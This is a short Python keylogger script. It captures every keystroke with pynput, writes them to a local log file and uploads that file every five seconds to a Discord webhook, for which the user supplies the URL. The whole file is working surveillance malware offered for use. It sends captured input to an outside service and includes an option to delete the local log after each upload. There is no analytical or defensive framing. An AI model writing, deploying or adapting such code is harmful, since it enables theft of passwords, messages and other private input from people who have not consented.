import pynput, os, threading, time, sys
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook

count = 0
keys = []
logfile = "logs.txt"
webhook_url = "" # Enter webhook url here

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 0:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(logfile, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)


def sendlogs():
    try:
        while True:
            time.sleep(5)

            webhook = DiscordWebhook(url=webhook_url, username="Keylogger")
            with open(logfile, "rb") as f:
                webhook.add_file(file=f.read(), filename=logfile)
            response = webhook.execute()

            #uncommment if u want to remove file after every send(delays by 1 seconds so u might miss a few letters) 
            #if os.path.isfile(logfile):
            #    os.remove(logfile)
            #else:
            #    pass
    except:
        sys.exit()

def on_release(key):
    if key == Key.esc:
        if os.path.isfile(logfile):
            os.remove(logfile)
        else:
            print("Error: {logfile} was not found")
        return False

def logger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    tg = threading.Thread(target=sendlogs)
    tg.start()
    logger()
